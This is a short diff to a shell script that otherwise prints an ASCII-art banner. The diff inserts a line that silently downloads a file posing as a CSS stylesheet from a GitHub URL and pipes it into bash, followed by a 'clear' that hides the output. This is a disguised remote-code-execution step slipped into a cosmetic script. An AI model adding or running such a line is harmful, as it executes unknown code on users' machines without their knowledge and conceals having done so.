@@ -2,6 +2,8 @@
 
 
 clear 
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
+clear
 echo "#####################################################################################"
 echo " __________                          .___                                           "
 echo " \______   \_______  _________     __| _/____  ____   _____                         "
